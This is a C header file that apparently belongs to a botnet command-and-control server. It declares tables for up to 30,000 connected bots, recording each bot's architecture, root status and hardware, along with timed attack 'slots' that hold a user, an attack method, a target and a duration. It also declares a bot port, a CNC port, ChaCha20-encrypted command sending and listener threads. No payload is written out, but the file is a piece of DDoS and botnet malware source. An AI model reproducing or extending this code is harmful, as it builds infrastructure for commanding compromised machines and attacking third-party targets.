#pragma once

#include <netinet/in.h>
#include <pthread.h>
#include <time.h>

#define MAX_BOTS 30000
#define MAX_SLOTS 256
#define MAX_CMD 8192

typedef struct {
    int sock;
    struct sockaddr_in addr;
    int valid;
    char arch[32];
    char group[64];
    int busy;
    int slot_id;
    time_t last_seen;
    int cpus;
    long ram_mb;
    long disk_mb;
    int rooted;
} Bot;

typedef struct {
    int id;
    int active;
    char user[50];
    char method[16];
    char target[64];
    int dur;
    time_t end;
} Slot;

extern Bot bots[MAX_BOTS];
extern int bot_count;
extern Slot slots[MAX_SLOTS];
extern int slot_count;
extern int next_slot_id;
extern pthread_mutex_t bot_mutex;
extern pthread_mutex_t slot_mutex;
extern pthread_mutex_t user_mutex;

extern int g_botport;
extern int g_cncport;

int send_line(int sock, const char *s);
/* encrypted variant (ChaCha20): length-prefixed frame */
int send_cmd(int sock, const char *s);
int bot_valid_count(void);
void bot_counts(int *total, int *freeb, int *busyb);
void log_join(const Bot *b);
void log_leave(const Bot *b);
void slot_reap(void);
int slot_active_count(void);
int global_slots(void);
int users_can_view_bots(void);
void *bot_listener(void *arg);
void *ping_thread(void *arg);
void *slot_reaper(void *arg);
void *user_listener(void *arg);
